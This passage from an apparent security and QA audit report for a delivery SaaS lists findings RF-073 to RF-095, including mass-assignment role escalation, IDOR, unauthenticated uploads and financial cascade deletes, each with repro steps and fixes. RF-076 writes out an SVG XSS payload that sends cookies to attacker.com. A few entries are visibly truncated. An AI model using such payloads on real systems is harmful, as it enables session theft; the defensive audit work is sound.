- **Expected:** The driver app's API client should be reviewed for the same classes of issues found in the mobile buyer app (missing 429 handling, incorrect 401 flow, incomplete offline queue integration).
- **Actual:** The driver app's API client (`apps/driver-app/lib/`) has not been reviewed at all. Unknown security or reliability issues may exist that mirror or exceed those found in the buyer mobile client.
- **Repro:**
  1. N/A — this is a coverage gap, not a confirmed bug.
  2. The audit scope excluded `apps/driver-app/lib/`.
- **Fix:** Assign a dedicated worker audit to `apps/driver-app/lib/` before release.
- **Prevention:** Include all app-level API clients in the standard pre-release audit checklist. Maintain a single shared API client library (`@routeflow/api-client`) used by both mobile apps to avoid per-app drift.

## Cross-Role Real-Time Gap Summary

This section maps every cross-role action to whether the observer receives a real-time update, and why it does or does not work.

### What DOES propagate correctly (code path correct; push delivery broken by RF-009)

| Action | Observer | Mechanism | Status |
|---|---|---|---|
| Customer places order | Operator web | `emitOrderCreated` + `emitUrgentOrder` via gateway | Code correct; web client missing (RF-002) |
| Operator confirms order | Buyer mobile | `emitOrderStatusChanged`; `notifications.sendToCustomer()` | Code correct; push fails (RF-009); no mobile WS client (RF-002) |
| Driver marks stop DELIVERED (driver path) | Operator web | `emitStopCompleted` via gateway | Code correct; web client missing (RF-002) |
| Driver marks stop DELIVERED (driver path) | Buyer mobile | `notifications.sendToCustomer()` | Code correct; push fails (RF-009) |
| Driver starts/completes run | Operator web | `emitDriverStatusUpdated` via gateway | Code correct; web client missing (RF-002) |

### What DOES NOT propagate (missing backend emission)

| Action | Observer | Gap | Finding |
|---|---|---|---|
| Operator dispatches route run | Driver mobile | No gateway emit, no push on dispatch | RF-015 |
| Operator completes stop (web dashboard path) | Buyer mobile | `routes.service.ts::completeStop()` emits nothing | RF-048 |
| Operator completes stop (web dashboard path) | Operator web | Same: no gateway emit from this code path | RF-048 |
| New route run created | Any client | `createRun()` has zero notification calls | RF-015 |

### Structural root causes

1. **No WebSocket client wired in the frontend (RF-002):** The backend Socket.IO gateway is production-ready. The frontend has never been connected. Every event the backend emits correctly disappears before reaching any client. This is the single highest-leverage fix: wiring the frontend unblocks all the correctly-coded emission paths simultaneously.

2. **100% push notification failure (RF-009):** Even if the WebSocket client were wired, push notifications (for mobile users in background) would still all fail because Expo proxy tokens are sent to Firebase FCM directly.

3. **RouteRun tenantId null (RF-001):** All new dispatches are invisible to drivers due to tenant isolation filtering out null-tenantId rows. This is independent of the real-time gap — even polling would not show the runs.

4. **Two divergent `completeStop()` code paths:** `routes.service.ts::completeStop()` (operator web path) and `orders.service.ts::completeStop()` (driver mobile path) have diverged. The driver path correctly emits events and auto-completes the run; the operator path does neither (RF-048, RF-016).

### As-is user experience (no fixes applied)

- **Operator** sees order counts and route status only by navigating between tabs. No live dashboard updates. Pending-orders count is stale until SPA navigation.
- **Driver** does not receive push on dispatch. Does not see newly dispatched runs even with manual refresh (RF-001). Must manually refresh route screen to see status changes.
- **Buyer** does not receive push when order is confirmed or delivered. Must manually pull-to-refresh orders screen to see status changes.

## Additional P0 — Blockers

### RF-073 — Any authenticated user can self-promote to OPERATOR role via mass assignment

- **Severity:** P0
- **Domain:** auth-security / RBAC
- **Surface:** API
- **Source:** W11-001
- **Issue:** `UpdateUserDto` (`apps/api/src/users/dto/update-user.dto.ts:7`) contains `@IsOptional() @IsEnum(UserRole) role?: UserRole`. The same DTO is used for both admin-editing and self-editing a user. `users.service.ts::update()` passes the DTO directly to Prisma without stripping the `role` field for non-admin callers. Any authenticated user (driver, customer, buyer) who knows their own user ID can call `PATCH /users/:id` with `{"role": "OPERATOR"}` and gain operator privileges.
- **Expected:** Only `TENANT_ADMIN` users should be able to modify another user's role. All other users' `PATCH /users/:id` requests should ignore the `role` field entirely.
- **Actual:** Any authenticated user can set their own role to `OPERATOR` or `TENANT_ADMIN` by including `{"role": "OPERATOR"}` in a self-PATCH request, immediately gaining full operator access.
- **Repro:**
  1. Log in as driver and decode the JWT to obtain `userId`.
  2. Send `PATCH /users/{userId}` with body `{"role": "OPERATOR"}` — receive HTTP 200.
  3. Log out and log back in — the new JWT contains `role: OPERATOR`.
  4. Access operator-only endpoints — all succeed.
- **Fix:** Split into `UpdateUserSelfDto` (no role field) and `UpdateUserAdminDto` (role field). Require `TENANT_ADMIN` role to mutate the role field. Strip role in the controller for self-update path.
- **Prevention:** Enable `whitelist: true, forbidNonWhitelisted: true` globally in the NestJS validation pipe so DTO fields not declared are automatically stripped. Add an integration test asserting that a driver calling `PATCH /users/:id` with `role: OPERATOR` does not result in a role change.
- **Status: FIXED in Session 5**

---

### RF-074 — `deleteCustomer()` silently hard-cascades all financial records — permanent data loss

- **Severity:** P0
- **Domain:** finance-pricing / data integrity
- **Surface:** API
- **Source:** W12-B1
- **Issue:** `customers.service.ts::deleteCustomer()` (lines 1220–1342) runs a transaction that unconditionally deletes: invoices, invoice items, credit notes, orders, order items, transactions, payments, advance payments, returns, return items, estimates, recurring invoices, and order templates. No check for PAID invoices, DELIVERED orders, or audit-relevant records. Operator clicking "Delete Customer" destroys all financial history permanently.
- **Expected:** Deleting a customer with PAID invoices, DELIVERED orders, or transaction history should be blocked with a clear error. At minimum, a soft-delete (archive) should be offered rather than irreversible destruction.
- **Actual:** `DELETE /customers/:id` unconditionally and permanently destroys all financial records associated with the customer, including PAID invoices and DELIVERED order history, with no confirmation or safeguard.
- **Repro:**
  1. Create a customer with at least one PAID invoice and one DELIVERED order.
  2. Call `DELETE /customers/:id`.
  3. Reload the finance dashboard — AR total decreases, PAID records are gone, audit history is lost.
- **Impact:** Permanent, unrecoverable data loss. Violates any financial audit requirement.
- **Fix:** Block deletion if customer has PAID/SENT invoices, DELIVERED orders, or transaction records. Offer archive/soft-delete. If hard delete required: restrict to SUPER_ADMIN with `force=true`, 24h delay, and email confirmation.
- **Prevention:** Add a pre-delete guard that checks for financial history and throws if found. Implement soft-delete (`isDeleted: Boolean @default(false)`) as the primary deletion mechanism. Add a SUPER_ADMIN-only endpoint for hard delete with a `confirmDeletion: true` flag. Add a unit test asserting that deleting a customer with PAID invoices returns 409.
- **Status: FIXED in Session 5**

---

### RF-075 — `GET /uploads/*` has no authentication guard — all uploaded files are publicly accessible

- **Severity:** P0
- **Domain:** auth-security
- **Surface:** API
- **Source:** W13-013
- **Issue:** `UploadsController` (`apps/api/src/uploads/uploads.controller.ts:16`) has no `@UseGuards(JwtAuthGuard)` at any level. Any unauthenticated HTTP client can fetch any file: product images, tenant logos, customer tax certificates, driver POD photos, signatures, tax documents. Key format (`tenants/{id}/logo.svg`) is partially guessable. This is the local-storage fallback used in development and early Railway deploys.
- **Expected:** All uploaded files should require authentication. Sensitive files (tax documents, POD signatures, customer data) should additionally require that the requesting user belongs to the same tenant as the file.
- **Actual:** Any unauthenticated HTTP client can fetch any uploaded file by guessing or obtaining its key. Customer tax certificates, driver POD signatures, and financial documents are all publicly accessible without a token.
- **Repro:**
  1. As an authenticated operator, upload a product image and note the returned URL.
  2. Open an incognito browser window (not logged in).
  3. Navigate to that URL — the file is served without requiring authentication.
- **Fix:** Add `@UseGuards(JwtAuthGuard)` to the controller. Verify key prefix matches requesting user's tenantId. Add `Content-Disposition: attachment` for non-image types.
- **Prevention:** Add an integration test asserting that `GET /uploads/*` returns 401 for unauthenticated requests. Add the uploads controller to the security audit checklist as a high-risk endpoint that must always have authentication guards.
- **Status: FIXED in Session 5**

---

### RF-076 — SVG logo upload allowed and served inline → stored XSS

- **Severity:** P0
- **Domain:** auth-security / upload-security
- **Surface:** API / web-operator / mobile-buyer
- **Source:** W14-001
- **Issue:** `tenants.controller.ts:144` explicitly allows `image/svg+xml` in the logo upload MIME allowlist. The `UploadsController` serves files inline with `Content-Type` from filename extension and no `Content-Disposition: attachment`. A malicious SVG with `<script>` tags executes JavaScript in every user's browser session when the branding logo loads.
- **Expected:** SVG uploads should either be blocked entirely or sanitized server-side before storage. Served SVG files should never execute embedded scripts in the browser.
- **Actual:** SVG files with embedded `<script>` tags are accepted, stored, and served inline as `image/svg+xml`. Any user who loads the dashboard after a malicious SVG logo is uploaded will have arbitrary JavaScript executed in their browser, enabling session token theft.
- **Repro:**
  1. Upload a file named `logo.svg` containing `<svg><script>document.location='https://attacker.com/?c='+document.cookie</script></svg>` via the logo upload endpoint.
  2. Log in as any user on the affected tenant.
  3. The dashboard logo loads — the browser executes the embedded script, exfiltrating session cookies.
- **Fix:** Remove `image/svg+xml` from the logo allowlist. Add `Content-Disposition: attachment` for all non-image types. If SVG required: sanitize with DOMPurify before storage.
- **Prevention:** Add an upload security test that attempts to upload an SVG with a `<script>` tag and asserts it is rejected with HTTP 400. Add `X-Content-Type-Options: nosniff` and `Content-Disposition: attachment` as default headers on the uploads serving path. Establish an explicit MIME allowlist for each upload endpoint (no `image/*` wildcards).
- **Status: FIXED in Session 5**

---

### RF-077 — Buyer and operator tokens share `localStorage` namespace — session stomping

- **Severity:** P0
- **Domain:** buyer-portal / auth-security
- **Surface:** web-buyer / web-operator
- **Source:** W15-001
- **Issue:** Buyer tokens (`buyerAccessToken`, `buyerRefreshToken`) and operator tokens (`accessToken`, `refreshToken`) coexist in the same `localStorage` at `routeflowmobile-production.up.railway.app`. Any open operator tab continuously refreshes its tokens, silently invalidating the buyer session. Confirmed via live browser testing: `buyerAccessToken` present after login, gone ~30 s later with operator tabs active.
- **Expected:** Buyer and operator sessions should be completely isolated so that operating tabs from both roles simultaneously in the same browser does not invalidate either session.
- **Actual:** The operator's background token refresh process silently overwrites or invalidates the buyer's session tokens within ~30 seconds. Buyers cannot complete checkout or view invoices while any operator tab is open in the same browser.
- **Impact:** Buyers cannot maintain a stable session when any operator tab is open in the same browser. Core buyer checkout flow broken in multi-tab or mixed-role scenarios.
- **Repro:**
  1. Open a browser with one tab logged in as buyer.
  2. Open a second tab and log in as operator.
  3. Wait ~30 seconds.
  4. Return to the buyer tab — the buyer session is invalidated and the buyer must log in again.
- **Fix:** Host buyer portal on a separate subdomain, OR use `sessionStorage` for buyer tokens, OR namespace all token keys (`buyer.accessToken` vs `operator.accessToken`) and guard auth initialization against stomping.
- **Prevention:** Add a browser integration test that maintains a buyer session and an operator session simultaneously and asserts the buyer session remains valid after 60 seconds. Use separate origin or storage namespacing as a long-term architectural solution.
- **Status: FIXED in Session 5**

---

## Additional P1 — High Priority

### RF-078 — All uploaded files served without `Content-Disposition: attachment` header

- **Severity:** P1
- **Domain:** upload-security
- **Surface:** API
- **Source:** W14-002
- **Issue:** `uploads.controller.ts:63-66` sets only `Content-Type` (derived from extension via `mime.lookup`). No `Content-Disposition` header. Browsers render renderable formats (SVG, HTML, PDF) inline in browser context. Any uploaded renderable file that bypasses MIME validation executes in the browser.
- **Expected:** All uploaded files except safe raster images (JPEG, PNG, WEBP) should be served with `Content-Disposition: attachment` so browsers download them rather than rendering them inline.
- **Actual:** All files are served without `Content-Disposition`, allowing browsers to render SVG, HTML, and PDF files inline in the browser context, enabling XSS if any such file contains malicious content.
- **Repro:**
  1. Upload any file (e.g., a PDF or SVG) via any upload endpoint.
  2. Navigate to the returned file URL directly.
  3. Observe the browser renders the file inline rather than prompting a download.
- **Fix:** Add `res.setHeader("Content-Disposition", "attachment; filename=\"" + path.basename(resolved) + "\"")` for all non-display-image file types.
- **Prevention:** Add a default `Content-Disposition: attachment` header in the uploads serving middleware and explicitly whitelist only raster image types for inline serving. Add an integration test asserting the header is present on non-image file responses.

---

### RF-079 — `isTaxExempt` field stored on Customer but never applied to invoices or orders

- **Severity:** P1
- **Domain:** finance-pricing
- **Surface:** API
- **Source:** W12-A4
- **Issue:** `Customer.isTaxExempt` boolean is in the schema, editable via API and UI. Neither `orders.service.ts` nor `invoice.service.ts` reads this field when computing tax. All customers are taxed at tenant rate regardless of exempt status. Confirmed: `grep -r isTaxExempt apps/api/src/orders apps/api/src/bookkeeping` → zero matches.
- **Expected:** When `Customer.isTaxExempt` is `true`, all orders and invoices for that customer should be created with 0% tax applied, in compliance with their tax-exempt status.
- **Actual:** The `isTaxExempt` flag is accepted and stored but never read during order or invoice tax calculation. Tax-exempt customers are incorrectly charged the full tenant tax rate on every transaction.
- **Repro:**
  1. Set a customer's `isTaxExempt` flag to `true`.
  2. Create an order for that customer.
  3. Inspect the order's `taxAmount` — it reflects the tenant tax rate, not 0%.
- **Fix:** In order/invoice creation, check `customer.isTaxExempt`; if true, apply 0% tax to all line items.
- **Prevention:** Add a unit test for order creation with a tax-exempt customer asserting `taxAmount: 0`. Add a CI check that searches for all usages of `isTaxExempt` and asserts it is used in both `orders.service.ts` and `invoices.service.ts`.
- **Status: FIXED in Session 2**

### RF-080 — `bulkDeleteCustomers()` destroys InvoiceItem/OrderItem from PAID invoices

- **Severity:** P1
- **Domain:** finance-pricing / data integrity
- **Surface:** API
- **Source:** W12-B2
- **Issue:** `bulkDeleteCustomers()` (lines 1350–1477) uses the same unconditional cascade as RF-074. Also contains a duplicate `routeRunStop.deleteMany` call at lines 1450 and 1453 (copy-paste error). Both functions permanently destroy PAID invoice items, corrupting the financial audit trail.
- **Expected:** Bulk-deleting customers with PAID invoices or DELIVERED orders should be blocked. No financial records should be permanently destroyed without explicit confirmation and authorization checks.
- **Actual:** Bulk customer deletion unconditionally destroys all associated financial records including PAID invoices, and has a copy-paste bug causing `routeRunStop.deleteMany` to run twice.
- **Repro:**
  1. Select two or more customers that have PAID invoices.
  2. Execute a bulk delete operation via the API.
  3. Observe all financial records, including PAID invoice items, are permanently destroyed.
- **Fix:** Same as RF-074 — block deletion of customers with financial history.
- **Prevention:** Extract a shared `assertCustomerDeletable(customerId)` guard function used by both single and bulk delete paths. Add a unit test for `bulkDeleteCustomers()` asserting it rejects when any customer in the batch has a PAID invoice. Fix the copy-paste duplicate call.
- **Status: FIXED in Session 1**

### RF-081 — `GET /returns/:id` exposes any customer's return to any CUSTOMER role (IDOR)

- **Severity:** P1
- **Domain:** auth-security / IDOR
- **Surface:** API
- **Source:** W11-002
- **Issue:** `GET /returns/:id` is accessible to CUSTOMER role with only a tenant check. No ownership check (no `customerId = requestingUser.customerId` filter). A customer with a valid JWT can enumerate return IDs and read other customers' returns within the same tenant — including delivery photos, signatures, and return reasons.
- **Expected:** A CUSTOMER-role user should only be able to view returns that belong to their own account. Attempting to view another customer's return should return `403 Forbidden` or `404 Not Found`.
- **Actual:** Any CUSTOMER-role JWT can access any return in the tenant by ID, exposing other customers' delivery photos, signatures, and return reasons.
- **Repro:**
  1. Log in as Buyer A and obtain Buyer B's return ID (e.g., from the operator portal or by enumeration).
  2. Call `GET /returns/{buyerB-returnId}` with Buyer A's JWT.
  3. Observe HTTP 200 with Buyer B's full return data.
- **Fix:** In `returns.service.ts::findOne()`, if `user.role === 'CUSTOMER'`, add `AND customerId = user.customerId` to the query.
- **Prevention:** Add an IDOR integration test for the returns detail endpoint asserting that Buyer A receives 403/404 when accessing Buyer B's return. Add IDOR prevention to the returns module as a checklist item when adding any new CUSTOMER-accessible endpoint.

---

### RF-082 — `POST /returns/:id/cancel` has no ownership check for CUSTOMER role

- **Severity:** P1
- **Domain:** auth-security / IDOR
- **Surface:** API
- **Source:** W11-003
- **Issue:** Same pattern as RF-081 — tenant isolation but no ownership enforcement. A customer can cancel another customer's return by knowing the return ID.
- **Expected:** A CUSTOMER-role user should only be able to cancel their own returns. Cancelling another customer's return should be rejected with `403 Forbidden`.
- **Actual:** Any CUSTOMER-role JWT can cancel any return in the tenant by ID, allowing malicious customers to disrupt competitors' returns.
- **Repro:**
  1. Log in as Buyer A and obtain Buyer B's active return ID.
  2. Call `POST /returns/{buyerB-returnId}/cancel` with Buyer A's JWT.
  3. Observe HTTP 200 — Buyer B's return is cancelled without authorization.
- **Fix:** Same as RF-081 — add `customerId` filter for CUSTOMER callers on the cancel path.
- **Prevention:** Enforce a shared `assertReturnOwnership(returnId, customerId)` helper called by all CUSTOMER-accessible return mutation endpoints. Add an IDOR test for the cancel endpoint.

### RF-083 — `GET /customers/:id` returns full customer PII to DRIVER role

- **Severity:** P1
- **Domain:** auth-security / PII exposure
- **Surface:** API
- **Source:** W11-004
- **Issue:** `GET /customers/:id` allows `[OPERATOR, DRIVER]` roles (`customers.controller.ts:150-153`). Response includes full PII: email, phone, billing address, credit terms, balance, all order history. Any driver can enumerate all customer IDs and harvest full tenant customer PII.
- **Expected:** DRIVER-role requests to `GET /customers/:id` should return only delivery-relevant fields (name, delivery address, phone), stripping financial and contact PII that drivers have no business need to access.
- **Actual:** Drivers receive the full customer record including email, billing address, credit terms, account balance, and order history — all information that should be restricted to operators.
- **Repro:**
  1. Authenticate as a driver.
  2. Enumerate customer IDs (or obtain one from a route assignment).
  3. Call `GET /customers/{customerId}` with the driver JWT.
  4. Observe full PII including email, balance, and credit terms in the response.
- **Fix:** For DRIVER role callers, project only delivery-relevant fields: name, delivery address, phone. Strip email, creditTerms, balance, notes, taxExempt status.
- **Prevention:** Implement response projection based on the caller's role using a `@Serialize(CustomerDriverDto)` decorator for driver callers. Add a security test asserting that driver-role responses do not contain `email`, `creditTerms`, or `balance` fields.

### RF-084 — `vendor-bills.service.ts::receive()` has no idempotency guard — double-receive doubles stock

- **Severity:** P1
- **Domain:** finance-pricing / inventory
- **Surface:** API
- **Source:** W13-001
- **Issue:** `receive(id)` (line 141) checks only that the bill exists, not that `bill.status !== 'RECEIVED'`. Double-clicking or network retry causes the full inventory increment loop to run twice — doubling stock increment for each product line and corrupting weighted average cost.
- **Expected:** Calling `receive()` on an already-received bill should return `409 Conflict` and not modify any inventory records.
- **Actual:** Double-clicking or retrying a network request causes the full inventory increment to run twice, doubling the stock quantity for each product line on the bill.
- **Repro:**
  1. Create a vendor bill with 5 units of Product A (stock currently 10).
  2. Call `POST /vendor-bills/:id/receive` twice in rapid succession.
  3. Inspect Product A's stock — it is 20 (stock doubled) instead of the correct 15.
- **Fix:** Add `if (bill.status === 'RECEIVED') throw new ConflictException('Bill already received')` at start of `receive()`.
- **Prevention:** Add a unit test for `receive()` that calls it twice and asserts the second call returns 409 and stock is only incremented once. Make `receive()` idempotent at the DB level by wrapping in a transaction that checks status inside the lock.
- **Status: FIXED in Session 2**

---

### RF-085 — `voidBill()` does not reverse stock movements from `receive()` — phantom inventory

- **Severity:** P1
- **Domain:** finance-pricing / inventory
- **Surface:** API
- **Source:** W13-002
- **Issue:** `voidBill()` (lines 286–290) is a one-line `status: VOID` update with no stock reversal. Voiding a received bill leaves phantom inventory that can be oversold.
- **Expected:** Voiding a received vendor bill should reverse all stock movements created during `receive()`, restoring inventory to its pre-receipt level.
- **Actual:** `voidBill()` only updates the bill status to VOID — no stock reversal is performed. Phantom inventory remains in the system and can be sold to customers who will not be able to receive the goods.
- **Repro:**
  1. Create a vendor bill for 10 units of Product A (stock: 5).
  2. Call `POST /vendor-bills/:id/receive` — stock becomes 15.
  3. Call `POST /vendor-bills/:id/void`.
  4. Check Product A's stock — it is still 15, not 5. Phantom inventory of 10 units remains.
- **Fix:** `voidBill()` must check `bill.status === 'RECEIVED'`; if so, create reverse `StockMovement` entries before setting VOID.
- **Prevention:** Add a unit test asserting that voiding a received bill results in a negative `StockMovement` that returns inventory to the pre-receive level. Enforce a rule: any operation that creates a `StockMovement` must have a corresponding reversal operation in the void/cancel flow.
- **Status: FIXED in Session 2**

### RF-086 — Buyer token expiry redirects to operator `/login` instead of `/customer-login`

- **Severity:** P1
- **Domain:** buyer-portal / auth
- **Surface:** web-buyer
- **Source:** W15-002
- **Issue:** On buyer token expiry, app redirects to `/login` (operator "Staff & Drivers" page). Buyer sees username/password/Remember-me operator form — wrong context, confusing.
- **Expected:** When a buyer's session expires, they should be redirected to `/customer-login` — the buyer-specific login screen — not the operator login screen.
- **Actual:** Buyers are redirected to `/login` (the operator "Staff & Drivers" form) on session expiry. The form context is wrong and buyers may be confused about what credentials to enter.
- **Repro:**
  1. Log in as a buyer and let the session expire (or manually clear the buyer token).
  2. Attempt any authenticated buyer action.
  3. Observe the redirect goes to `/login` (operator form) rather than `/customer-login`.
- **Fix:** Buyer auth guard must redirect to `/customer-login` on 401.
- **Prevention:** Add a unit test for the buyer auth guard asserting it redirects to `/customer-login` on 401. Add the buyer/operator login redirect routing as a standard CI smoke test.

### RF-087 — `/customer-login` redirected to operator home when operator session exists

- **Severity:** P1
- **Domain:** buyer-portal / auth
- **Surface:** web-buyer
- **Source:** W15-003
- **Issue:** The app's top-level route guard checks for any `accessToken` and redirects to `/home`, catching buyers in a browser that also has an operator session.
- **Expected:** The top-level route guard on `/customer-login` should only check for `buyerAccessToken` — the presence of an operator `accessToken` should not redirect to the operator home.
- **Actual:** If an operator session exists in `localStorage`, any attempt to navigate to `/customer-login` is intercepted and redirected to `/home` (the operator dashboard). Buyers cannot log in to the buyer portal while an operator session is active in the same browser.
- **Repro:**
  1. Log in as operator in a browser tab — `accessToken` is stored in localStorage.
  2. Navigate to `/customer-login`.
  3. Observe the redirect to `/home` — the buyer login page is inaccessible.
- **Fix:** Buyer portal route guard should check only `buyerAccessToken`, not `accessToken`.
- **Prevention:** Add a test asserting that `/customer-login` renders normally even when an operator `accessToken` is present in localStorage. Establish a naming convention: buyer guards must reference only `buyerAccessToken` and operator guards must reference only `accessToken`.

### RF-088 — Invoice detail shows infinite spinner on 401 — no error state, no escape

- **Severity:** P1
- **Domain:** buyer-portal
- **Surface:** web-buyer
- **Source:** W15-004
- **Issue:** `GET /api/v1/buyer/invoices/:id` → 401 causes UI to display an infinite loading spinner with no error message, no retry, and no way to navigate away.
- **Expected:** A 401 response on the invoice detail page should display an error message like "Please sign in again" with a link to the buyer login page, allowing the user to recover without needing to use the browser back button.
- **Actual:** A 401 response causes the invoice detail page to show an infinite loading spinner. The user is trapped with no error message, no navigation options, and no way to recover within the UI.
- **Repro:**
  1. Navigate to a buyer invoice detail page.
  2. Invalidate the buyer session token (or wait for expiry).
  3. Observe the page shows an infinite spinner with no error or navigation option.
- **Fix:** Add 401 error handler in invoice detail component. Show "Unable to load. Please sign in again" with link to `/customer-login`.
- **Prevention:** Add a global error boundary component for all buyer portal screens that handles 401 responses with a consistent "Sign in again" UI. Add a UI test for the invoice detail 401 scenario asserting the error state renders correctly.

### RF-089 — "Place Order" button silently fails when buyer token is missing — no feedback

- **Severity:** P1
- **Domain:** buyer-portal
- **Surface:** web-buyer
- **Source:** W15-005
- **Issue:** When buyer token is invalidated, clicking "Place order" does nothing — no toast, no redirect, no disabled state. CORS preflight fires but the POST is dropped silently.
- **Expected:** Clicking "Place Order" with an expired session should redirect the buyer to the login page with a message like "Your session expired. Please sign in to complete your order."
- **Actual:** Clicking "Place Order" with an invalid token produces no visible feedback — no error toast, no redirect, no disabled button state. The CORS preflight fires but the POST is silently dropped.
- **Repro:**
  1. Load the buyer checkout page.
  2. Invalidate the buyer session token manually (remove from localStorage).
  3. Click "Place Order."
  4. Observe nothing happens — no feedback of any kind.
- **Fix:** Handle 401 from `POST /api/v1/buyer/orders` with user-facing error and redirect to buyer login.
- **Prevention:** Add a UI test for the checkout 401 scenario asserting that a user-facing error or redirect occurs. Add global 401 handling in the buyer API client that redirects to `/customer-login` rather than silently dropping the request.

### RF-090 — Settings Users tab entirely absent — no way to manage operator users from the UI

- **Severity:** P1
- **Domain:** browser-ux / settings
- **Surface:** web-operator
- **Source:** W16-005
- **Issue:** No Users management tab exists in Settings. Routes `/settings/users` and `/users` both return "Unmatched Route — Page could not be found." The only way to create/manage operator users is via direct API calls.
- **Expected:** Operators should be able to create, edit, delete, and manage user roles via a Users tab in the Settings screen — a standard capability for any multi-user SaaS product.
- **Actual:** There is no Users management tab. All user management (creating drivers, operators, buyers) requires direct API calls, making the product unusable for non-technical operators.

  2. Observe no Users tab exists.
  3. Navigate directly to `/settings/users` — "Page could not be found" error.

### RF-091 — `canActAsDriver` toggle not exposed in any UI surface

- **Severity:** P1
- **Domain:** browser-ux / settings
- **Surface:** web-operator / mobile-operator
- **Source:** W16-006
- **Issue:** The `canActAsDriver` flag that enables the Operator/Driver mode-switcher is not exposed anywhere in the UI — not in Settings, not in a Users tab, not on the Profile page. TENANT_ADMIN cannot enable dual-role mode via any UI path. Mode-switcher pill is absent as a direct consequence (W16-007). Browser testing confirmed: `ux_admin` (TENANT_ADMIN) has no mode-switcher pill.
- **Expected:** TENANT_ADMIN users should be able to enable/disable dual-role (operator+driver) mode via a toggle in their profile or the Users tab. The mode-switcher pill should appear in the header when the flag is enabled.
- **Actual:** There is no UI to toggle `canActAsDriver`. TENANT_ADMIN users have no mode-switcher pill even if the flag is set in the DB, because the toggle is inaccessible. The dual-role feature is effectively non-functional via any normal UI path.
- **Repro:**
  1. Log in as TENANT_ADMIN (`ux_admin`).
  2. Navigate to Profile and Settings — no `canActAsDriver` toggle exists.
  3. Observe no mode-switcher pill in the header.
- **Fix:** (1) Expose `canActAsDriver` toggle in a Users tab per-user entry and in Profile for self-service. (2) Confirm `TENANT_ADMIN` defaults to `canActAsDriver: true` and the token includes the field. (3) Render `ModeSwitcherPill` in header when `canActAsDriver: true`.
- **Prevention:** Add the mode-switcher pill visibility to the release smoke test for TENANT_ADMIN accounts. Link `canActAsDriver` rendering to the Users tab build (RF-090) so both ship together.

### RF-092 — Offline queue unbounded growth and silent 4xx discard without user notification

- **Severity:** P1
- **Domain:** driver-pod / offline
- **Surface:** mobile-driver
- **Source:** W19-001, W19-002
- **Issue:** (a) No max-size cap or TTL on the offline queue (`offlineQueue.ts`). A driver who loses connectivity for extended time accumulates unlimited pending actions, potentially exhausting AsyncStorage. (b) When a queued action receives a 4xx error on replay (e.g., stop already completed by operator, order cancelled), the action is silently discarded with no user notification. The driver never knows what data was lost.
- **Expected:** (a) The offline queue should have a maximum size cap and show a UI badge indicating queue depth. (b) Permanently discarded actions should appear in a "failed syncs" inbox with a persistent in-app notification.
- **Actual:** (a) The queue grows without limit, potentially exhausting AsyncStorage storage on extended offline periods. (b) 4xx-failed actions are silently removed — the driver has no indication any data was lost.
- **Repro for (b):**
  1. Complete a stop offline while the operator simultaneously cancels the run.
  2. When the driver reconnects, the queued stop completion hits 409 or 404.
  3. The action is silently discarded — no alert, no failed inbox entry appears.
- **Fix:** (a) Add `MAX_QUEUE_SIZE = 100` cap with oldest-first eviction and UI badge showing queue depth. (b) Add failed-inbox (persisted to AsyncStorage) for discarded items; show persistent in-app alert; surface "Review failed syncs" screen.
- **Prevention:** Add a unit test asserting the queue is capped at `MAX_QUEUE_SIZE` with eviction. Add a failed-inbox persistence test asserting that 4xx-failed items appear in the failed inbox after sync. Include queue depth and failed sync count in app startup health telemetry.

---

### RF-093 — `forcePasswordChange` flag not enforced at API layer — bypassable via direct API calls

- **Severity:** P1
- **Domain:** auth-security
- **Surface:** API
- **Source:** W20-001
- **Issue:** The `forcePasswordChange` flag is processed at the UI layer only. A user with this flag set can bypass the change-password screen by calling API endpoints directly (or via the mobile app's API client). No server-side middleware checks the flag and rejects non-change-password requests.
- **Expected:** When `user.forcePasswordChange` is `true`, all API endpoints except `/auth/change-password` and `/auth/logout` should return `403 Forbidden` with `{"code":"FORCE_PASSWORD_CHANGE"}`, preventing any other action until the password is changed.
- **Actual:** The `forcePasswordChange` flag is only checked in the UI. Any user with this flag set can bypass the UI restriction by calling API endpoints directly (via curl, Postman, or the mobile app), gaining full API access without changing their password.
- **Repro:**
  1. Set `user.forcePasswordChange = true` for a test user.
  2. Log in as that user and obtain a JWT (the login succeeds).
  3. Call any API endpoint directly with that JWT (e.g., `GET /orders`).
  4. Observe HTTP 200 — the force-password-change restriction is not enforced.
- **Fix:** Add a NestJS guard or middleware that checks `user.forcePasswordChange` on every request and returns 403 with `{"code":"FORCE_PASSWORD_CHANGE"}` for all endpoints except `/auth/change-password` and `/auth/logout`.
- **Prevention:** Add an integration test asserting that a user with `forcePasswordChange: true` receives 403 on all endpoints except the change-password endpoint. Encode `forcePasswordChange` in the JWT claims so the guard does not require a DB lookup on every request.
- **Status: FIXED in Session 2**

- **Severity:** P1
- **Domain:** buyer-portal

- **Issue:** `GET /api/v1/buyer/standing-orders` (with valid buyer JWT) returns 404. The UI displays standing orders via some other internal route not captured during testing.

## Additional P2 — Medium Priority

### RF-095 — `UpdateUserDto.role` field present in self-update DTO path

- **Severity:** P2
- **Domain:** auth-security
- **Surface:** API
- **Source:** W11-005
- **Issue:** Root cause of RF-073. Even if the controller is fixed, the `role` field being `@IsOptional()` in a shared DTO means any future route reuse or refactor can re-introduce the vulnerability. Must be fixed at DTO level.
- **Expected:** The self-update DTO should not contain a `role` field. Role mutation should only be possible through a separate admin-only DTO and endpoint.
- **Actual:** The shared `UpdateUserDto` contains `@IsOptional() role?: UserRole`. Even if the controller strips it today, a future refactor reusing this DTO in a non-admin context would silently re-introduce role self-promotion.
- **Repro:**
  1. Inspect `apps/api/src/users/dto/update-user.dto.ts`.
  2. Confirm the `role` field is present and `@IsOptional()`.
  3. This is a latent vulnerability that becomes active without the controller-level guard from RF-073.
- **Fix:** Remove `role` from the shared DTO; create `AdminUpdateUserDto` that extends base with role field.
- **Prevention:** Enable NestJS global `whitelist: true, forbidNonWhitelisted: true` validation pipe so undeclared DTO fields are automatically stripped. Add a lint rule preventing `role` from appearing in any non-admin DTO.
